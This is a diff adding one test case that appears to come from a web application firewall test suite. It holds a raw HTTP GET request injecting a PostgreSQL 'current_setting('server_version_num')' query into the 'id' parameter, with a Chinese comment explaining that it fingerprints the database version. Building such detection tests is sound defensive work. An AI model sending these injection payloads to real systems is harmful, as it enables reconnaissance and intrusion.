@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506332
+# 攻击者基于查询，将"select current_setting('server_version_num')"语句注入到 SQL 查询参数中，利用current_setting函数来获取数据库的版本号信息
+GET /?id=select%20current_setting%28%27server_version_num%27%29&bid=hd_tag_m8mv23zn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23zn
+RM-PRO-Token: ce80a5ede89351750c3317e9cde48ef5
+RM-PRO-Time: 1742808355049
+User-Agent: curl/7.83.1
+
